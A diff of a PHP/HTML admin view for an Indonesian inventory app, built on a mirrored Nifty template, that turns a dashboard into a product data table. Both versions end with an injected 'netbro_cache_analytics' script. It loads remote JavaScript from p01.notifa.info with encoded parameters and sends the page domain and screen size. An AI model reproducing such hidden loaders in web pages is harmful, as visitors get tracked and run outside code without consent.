@@ -1,7 +1,17 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+
+
+<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:05 GMT -->
 <head>
-	<title>	Beranda	</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Data Tables | Nifty - Admin Template</title>
+
 
     <!--STYLESHEET-->
     <!--=================================================-->
@@ -34,6 +44,38 @@
     <!--Demo [ DEMONSTRATION ]-->
     <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">
 
+
+        
+    <!--DataTables [ OPTIONAL ]-->
+    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
+	<link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">
+
+    
+    <!--=================================================
+
+    REQUIRED
+    You must include this in your project.
+
+
+    RECOMMENDED
+    This category must be included but you may modify which plugins or components which should be included in your project.
+
+
+    OPTIONAL
+    Optional plugins. You may choose whether to include it in your project or not.
+
+
+    DEMONSTRATION
+    This is to be removed, used for demonstration purposes only. This category must not be included in your project.
+
+
+    SAMPLE
+    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.
+
+
+    Detailed information and more samples can be found in the document.
+
+    =================================================-->
         
 </head>
 
@@ -188,22 +230,22 @@
                                         <p class="dropdown-header"><i class="demo-pli-file-jpg icon-lg icon-fw"></i> Gallery</p>
                                         <div class="row img-gallery">
                                             <div class="col-xs-4">
-                                                <img class="img-responsive" src="<?php echo base_url();?>assets/adminlte/img/thumbs/img-1.jpg" alt="thumbs">
+                                                <img class="img-responsive" src="img/thumbs/img-1.jpg" alt="thumbs">
                                             </div>
                                             <div class="col-xs-4">
-                                                <img class="img-responsive" src="<?php echo base_url();?>assets/adminlte/img/thumbs/img-3.jpg" alt="thumbs">
+                                                <img class="img-responsive" src="img/thumbs/img-3.jpg" alt="thumbs">
                                             </div>
                                             <div class="col-xs-4">
-                                                <img class="img-responsive" src="<?php echo base_url();?>assets/adminlte/img/thumbs/img-2.jpg" alt="thumbs">
+                                                <img class="img-responsive" src="img/thumbs/img-2.jpg" alt="thumbs">
                                             </div>
                                             <div class="col-xs-4">
-                                                <img class="img-responsive" src="<?php echo base_url();?>assets/adminlte/img/thumbs/img-4.jpg" alt="thumbs">
+                                                <img class="img-responsive" src="img/thumbs/img-4.jpg" alt="thumbs">
                                             </div>
                                             <div class="col-xs-4">
-                                                <img class="img-responsive" src="<?php echo base_url();?>assets/adminlte/img/thumbs/img-6.jpg" alt="thumbs">
+                                                <img class="img-responsive" src="img/thumbs/img-6.jpg" alt="thumbs">
                                             </div>
                                             <div class="col-xs-4">
-                                                <img class="img-responsive" src="<?php echo base_url();?>assets/adminlte/img/thumbs/img-5.jpg" alt="thumbs">
+                                                <img class="img-responsive" src="img/thumbs/img-5.jpg" alt="thumbs">
                                             </div>
                                         </div>
                                         <a href="#" class="btn btn-block btn-primary">Browse Gallery</a>
@@ -382,22 +424,74 @@
             <div id="content-container">
                 <div id="page-head">
                     
-<div class="pad-all text-center">
-    <h3>Selamat Datang</h3>
-    <p1>Admin</p>
-</div>
+                    <!--Page Title-->
+                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+                    <div id="page-title">
+                        <h1 class="page-header text-overflow">Data Tables</h1>
                     </div>
+                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+                    <!--End page title-->
 
-                    <!-- content -->
-                   
-                    
-                              
-                                              
-                        
+
+                    <!--Breadcrumb-->
+                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+                    <ol class="breadcrumb">
+					<li><a href="#"><i class="demo-pli-home"></i></a></li>
+					<li><a href="#">Tables</a></li>
+					<li class="active">Data Tables</li>
+                    </ol>
+                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+                    <!--End breadcrumb-->
+
                 </div>
 
-            
-                    <!-- end content -->
+                
+                <!--Page content-->
+                <!--===================================================-->
+                <div id="page-content">
+                    
+					<!-- Basic Data Tables -->
+					<!--===================================================-->
+					<div class="panel">
+					    <div class="panel-heading">
+					        <h3 class="panel-title">Tambah Data</h3>
+                            <p><a href="#" class="btn btn-success" data-target="#ModalAdd" data-toggle="modal">Add Data</a>
+                            </p>
+					    </div>
+					    <div class="panel-body">
+					        <table id="demo-dt-basic" class="table table-striped table-bordered" cellspacing="0" width="100%">
+					            <thead>
+					                <tr>
+					                    <th>No</th>
+					                    <th>Kode Barang</th>
+					                    <th class="min-tablet">Nama Barang</th>
+					                    <th class="min-tablet">Kategori</th>
+					                    <th class="min-desktop">Foto</th>
+					                    <th class="min-desktop">Harga</th>
+                                        <th class="min-desktop">Stok</th>
+                                        <th class="min-desktop">Aksi</th>
+					                </tr>
+					            </thead>
+					            <tbody>
+					                
+					            </tbody>
+					        </table>
+					    </div>
+					</div>
+					<!--===================================================-->
+					<!-- End Striped Table -->
+					
+					
+					
+					
+                </div>
+                <!--===================================================-->
+                <!--End page content-->
+
+            </div>
+            <!--===================================================-->
+            <!--END CONTENT CONTAINER-->
+
 
             
             <!--ASIDE-->
@@ -446,7 +540,7 @@
                                     <div class="list-group bg-trans">
 							            <a href="#" class="list-group-item">
 							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/2.png" alt="Profile Picture">
+							                    <img class="img-circle img-xs" src="img/profile-photos/2.png" alt="Profile Picture">
 												<i class="badge badge-success badge-stat badge-icon pull-left"></i>
 							                </div>
 							                <div class="media-body">
@@ -456,7 +550,7 @@
 							            </a>
 							            <a href="#" class="list-group-item">
 							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/7.png" alt="Profile Picture">
+							                    <img class="img-circle img-xs" src="img/profile-photos/7.png" alt="Profile Picture">
 							                </div>
 							                <div class="media-body">
 							                    <p class="mar-no text-main">Brittany Meyer</p>
@@ -465,7 +559,7 @@
 							            </a>
 							            <a href="#" class="list-group-item">
 							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" alt="Profile Picture">
+							                    <img class="img-circle img-xs" src="img/profile-photos/1.png" alt="Profile Picture">
 												<i class="badge badge-info badge-stat badge-icon pull-left"></i>
 							                </div>
 							                <div class="media-body">
@@ -475,7 +569,7 @@
 							            </a>
 							            <a href="#" class="list-group-item">
 							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/4.png" alt="Profile Picture">
+							                    <img class="img-circle img-xs" src="img/profile-photos/4.png" alt="Profile Picture">
 							                </div>
 							                <div class="media-body">
 							                    <p class="mar-no text-main">Donald Brown</p>
@@ -484,7 +578,7 @@
 							            </a>
 							            <a href="#" class="list-group-item">
 							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/8.png" alt="Profile Picture">
+							                    <img class="img-circle img-xs" src="img/profile-photos/8.png" alt="Profile Picture">
 												<i class="badge badge-warning badge-stat badge-icon pull-left"></i>
 							                </div>
 							                <div class="media-body">
@@ -494,7 +588,7 @@
 							            </a>
 							            <a href="#" class="list-group-item">
 							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/9.png" alt="Profile Picture">
+							                    <img class="img-circle img-xs" src="img/profile-photos/9.png" alt="Profile Picture">
 												<i class="badge badge-danger badge-stat badge-icon pull-left"></i>
 							                </div>
 							                <div class="media-body">
@@ -678,9 +772,9 @@
             </aside>
             <!--===================================================-->
             <!--END ASIDE-->
-        </div>
 
-           <!--MAIN NAVIGATION-->
+            
+             <!--MAIN NAVIGATION-->
             <!--===================================================-->
             <nav id="mainnav-container">
                 <div id="mainnav">
@@ -788,11 +882,15 @@
 						
 						                <!--Submenu-->
 						                <ul class="collapse in">
-						                    <li class="active-link"><a href=<?php echo base_url('Dashboard/Barang') ?>>Data Barang</a></li>
-
+						                    <li class="active-link"><a href="index.html">Data Barang</a></li>
+                                             <ul class="collapse">
+                                            <li><a href="<?php echo base_url('d.Barang.php/Barang') ?>">Data Barang</a></li>
+                                            
+                                            
+                                        </ul>
 											<li><a href="dashboard-2.html">Riwayat Barang</a></li>
 											<li><a href="dashboard-3.html">Barang Masuk</a></li>
-											<li><a href="dashboard-4.html">Barang Keluar</a></li>
+											<li><a href="dashboard-4.html">Barang keluar</a></li>
 											
 						                </ul>
 						            </li>
@@ -807,7 +905,7 @@
 						
 						                <!--Submenu-->
 						                <ul class="collapse">
-						                    <li><a href="<?php echo base_url('Dashboard/pegawai') ?>">Data Pegawai</a></li>
+						                    <li><a href="<?php echo base_url('Dashboard-3/Barang') ?>">Data Barang</a></li>
 											
 											
 						                </ul>
@@ -837,15 +935,18 @@
             <!--===================================================-->
             <!--END MAIN NAVIGATION-->
 
+        </div>
 
-           	     <!-- FOOTER -->
+        
+
+        <!-- FOOTER -->
         <!--===================================================-->
         <footer id="footer">
 
             <!-- Visible when footer positions are fixed -->
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
             <div class="show-fixed pad-rgt pull-right">
-                 <a href="#" class="text-main"><span class="badge badge-danger">3</span>  </a>
+                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
             </div>
 
 
@@ -853,7 +954,7 @@
             <!-- Visible when footer positions are static -->
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
             <div class="hide-fixed pull-right pad-rgt">
-                 <strong></strong> 
+                14GB of <strong>512GB</strong> Free.
             </div>
 
 
@@ -862,7 +963,7 @@
             <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
 
-            <p class="pad-lft">&#0169; </p>
+            <p class="pad-lft">&#0169; 2018 Your Company</p>
 
 
 
@@ -905,26 +1006,23 @@
     <!--=================================================-->
     
     <!--Demo script [ DEMONSTRATION ]-->
-    <!-- <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->
+  <!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->
 
     
-    <!--Flot Chart [ OPTIONAL ]-->
-    <script src="<?php echo base_url();?>assets/adminlte/plugins/flot-charts/jquery.flot.min.js"></script>
-    <script src="<?php echo base_url();?>assets/adminlte/plugins/flot-charts/jquery.flot.resize.min.js"></script>
-    <script src="<?php echo base_url();?>assets/adminlte/plugins/flot-charts/jquery.flot.tooltip.min.js"></script>
+    <!--DataTables [ OPTIONAL ]-->
+    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
+	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
+	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>
 
 
-    <!--Sparkline [ OPTIONAL ]-->
-    <script src="<?php echo base_url();?>assets/adminlte/plugins/sparkline/jquery.sparkline.min.js"></script>
-
-
-    <!--Specify page [ SAMPLE ]-->
-    <script src="<?php echo base_url();?>assets/adminlte/js/demo/dashboard.js"></script>
+    <!--DataTables Sample [ SAMPLE ]-->
+    <script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>
 
 
     
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2CNaLknYAoSAvs98oacbv6DvMT%2f%2bY5LXMhffm4NwPkWsBjhVYydA5TgexA5TPuehJcf1rofsTxUshKgS6JGNbcp094lptdV%2faEEvmPBGT%2f%2bIUz8fPFAYVv1kyrePfLnn1OIfND64krcAPqYoRw9tD4jYuQc2I2CQdA43NL%2fz%2fgmSNsHp04Lxd9Zejir9TpvEeP6jajSbHKOwzztx84mRbvJ2WSeZLg6X3uDywp%2f9VMTLnTbijBZSQATZp7JFw69O%2b9miydF4%2ftpF1iSAlQ8cDhTq9Evag%2bbjXgK8x8W0oRTVSNKbgUsZ6PXKuaOcBD5wknwERS0uyfNvDliFbbvVG6reDMOEB5T6kw5vnX%2b3YnmxR3UyKwJcz0cPHteHN0gj28enWF0bPLTUbRdPr%2bJ2LDgjrM%2fFqOf7pVnse7V3lJUoRQ8alqU1dgfCQQv07ndsn2wiLGCto01k%2bzo5%2btBsCZzsY%2bLzIRBbdPD3d%2fAL1xBo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
-<!-- Mirrored from www.themeon.net/nifty/v2.9.1/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:04:50 GMT -->
+<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
 </html>
+
